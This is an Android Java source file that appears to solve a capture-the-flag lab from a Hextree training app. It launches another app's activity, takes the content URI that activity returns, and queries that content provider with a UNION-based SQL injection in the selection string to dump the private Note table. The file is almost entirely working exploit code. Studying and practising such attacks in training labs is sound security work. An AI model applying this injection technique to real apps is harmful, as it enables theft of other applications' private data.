package com.hextree.getflag;

import android.annotation.SuppressLint;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.view.View;
import android.widget.TextView;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

public class ContentProviderFlag33_1 extends AppCompatActivity {
    @Override
    protected void onCreate(@Nullable @org.jetbrains.annotations.Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
//        TextView flag33_log = findViewById(R.id.flag_log);
        Intent intent = new Intent("io.hextree.FLAG33");
        intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag33Activity1");
//        intent.putExtra("secret", "ANYTHING");
        startActivityForResult(intent, 1);
    }

    @SuppressLint("MissingSuperCall")
    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable @org.jetbrains.annotations.Nullable Intent data) {
        Cursor cursor = getContentResolver().query(data.getData(), null, "1=1 UNION SELECT title,content, NULL, NULL FROM Note--",   null, null);

        if (cursor!=null && cursor.moveToFirst()) {
            StringBuilder sb = new StringBuilder();
            do {
                for (int i = 0; i < cursor.getColumnCount(); i++) {
                    if (sb.length() > 0 && i != 0) {
                        sb.append(", ");
                    }
                    sb.append(cursor.getColumnName(i) + " = " + cursor.getString(i));
                }
                sb.append("\n");
            } while (cursor.moveToNext());
            Utils.dumpQuery(ContentProviderFlag33_1.this, sb.toString());
        }
    }
}
